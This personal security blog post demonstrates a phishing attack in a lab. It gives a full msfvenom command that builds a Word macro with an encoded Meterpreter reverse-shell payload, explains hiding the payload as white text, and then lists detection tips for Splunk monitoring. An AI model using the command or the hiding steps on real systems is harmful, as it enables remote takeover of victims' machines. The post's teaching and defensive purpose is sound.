Home [CyberZombi3](https://cyberzombi3.github.io/CyberZombi3.co.uk/)

# PhishMe

Phish Me.........
Apologies for the lack of posts, I've been a little busy lately with getting a room sorted for my recently announced little one, along with my GPEN and my OSCP and just life in general, things have been a little manic to say the least.

Anyway I wanted to post something along the lines of Phishing and how it may look in my Splunk app, Mitre Att&ck Monitoring. Then whilst I was working on it I realised I cant really show everything I would want as I don't have that setup within my lab, So I guess will demo how to create a malicious document, email it to a victim to run and then talk a little about what to look out for.

The below is just a high level view of the above mentioned process with what tools I have available to me.

So I created a macro and payload using MsfVenom with the following command - msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.140.17 LPORT=4545 -e x86/shikata_ga_nai -f vba-exe


This then goes off and creates some vba code and a payload both need to be inserted into your malicious word document, it looks a little like below.


These then need to be added into the Word doc as you can see below. Just go ahead and copy and paste the code into the blank vba screen.
Create a nice looking document that suits the needs of your victim. Notice below the grey shaded area, that's the payload code that for this demo I have shrunk down the text size and changed the colour to white just so its not immediately seen, this could be hidden in an image or the footer that's really up to you how you want to go about hiding it.
So now were ready to send the email. It appears in the victims inbox as expected.
The user then opens the file and the payload runs. The user maybe prompted to enable editing. I found that that wasn't always the case when playing around with this. From then on in we can see in Splunk the word doc and what looks to be a strange looking executable ran at the time of execution.


This can then be confirmed from your newly gained Meterpreter session. Below we see the creation and the connection made.


As the attacker you can then go off and do what it is you need to do, escalate privileges, steal data etc etc.

So I also wanted to talk about what you can lookout for in your monitoring tools, things like -

obscure file names
office applications spawning processors
office applications attempting to connect to unknown URL's
discovery commands being ran by strange user accounts, maybe at strange times of the day, for example whoami ipconfig net accounts.
.HTA files within emails
If there are links in the email, hover over them to check the URL
if possible configure IDS / IPS & APT
Educate users via phishing simulations

The Splunk app I'm working on looks for all types of things based off the Mitre Att&ck framework but 1 or 2 events alone doesn't automatically mean malicious activity is occurring, with my app I want to get your attention by highlighting a whole bunch of events, then you will need to manually go off and build that bigger picture of an incident if there is one of course.

Below there are a few screenshots, I've mentioned it in some of my previous posts so you may have seen it before. I could probably release it as is now although its far from complete and currently does not cover the entire MA framework, let me know what you think.


For anyone wanting to have a play around with Phishing I came across the Morning Catch VM a while back and although it's a little dated now it still does the job.

Find out more about it here - https://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/

Obviously the information above should not be used to be internationally malicious and if that is your choice I cannot be held responsible for any of your actions, this post is for educational purpose only.

Find me on Twitter @CyberZombi3

Cheers

#Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #MitreAttack #Phishing
